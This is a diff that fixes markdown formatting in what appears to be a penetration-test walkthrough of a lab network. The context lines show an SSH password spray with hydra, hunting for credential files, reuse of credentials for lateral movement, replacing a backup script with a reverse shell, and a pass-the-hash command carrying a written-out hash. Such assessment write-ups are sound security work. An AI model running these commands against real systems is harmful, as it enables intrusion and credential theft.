@@ -29,8 +29,8 @@ nmap -sS -sV -sC -p- 192.168.78.10,192.168.78.20,192.168.78.30,192.168.78.40
 ```
 ## Phase 2: Initial Compromise (45 minutes)
 
-SSH Credential Attack
-bash
+### SSH Credential Attack
+```bash
 
 # Password spray against common service account names
 hydra -L /usr/share/wordlists/common_usernames.txt \
@@ -61,11 +61,11 @@ sudo -l
 
 Evidence Collected: Gained initial foothold via weak SSH credentials with ability to restart web services.
 
-
+```
 ## Phase 3: Internal Reconnaissance & Database Access (60 minutes)
 
-Local Enumeration
-bash
+### Local Enumeration
+```bash
 
 # Search for configuration files and credentials
 find /home/svc_webapp -type f -name "*.txt" -o -name "*.conf" -o -name "*.config" 2>/dev/null
@@ -102,11 +102,11 @@ SELECT COUNT(*) FROM financial_records;
 
 Evidence Collected: Accessed customer database containing 15,000 records and extracted domain user credentials.
 
-
+```
 ## Phase 4: Lateral Movement (75 minutes)
 
-Credential Reuse Testing
-bash
+### Credential Reuse Testing
+```bash
 
 # Test discovered credentials on application server
 ssh jsmith@app-server-01.internal.corp
@@ -137,11 +137,11 @@ cat /opt/scripts/backup.sh
 
 Evidence Collected: Successfully moved laterally using reused credentials and identified privilege escalation vector.
 
-
+```
 ## Phase 5: Privilege Escalation (90 minutes)
 
-Privilege Escalation Execution
-bash
+### Privilege Escalation Execution
+```bash
 
 # Replace backup script with reverse shell
 cat > /opt/scripts/backup.sh << 'EOF'
@@ -169,11 +169,11 @@ ls -la /etc/secrets/
 
 Evidence Collected: Achieved root-level access via privilege escalation and extracted credential hashes.
 
-
+```
 ## Phase 6: Domain Compromise (30 minutes)
 
-Pass-the-Hash Attack
-bash
+### Pass-the-Hash Attack
+```bash
 
 # Using extracted local admin hash
 pth-winexe -U administrator//aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 //dc-01.internal.corp cmd
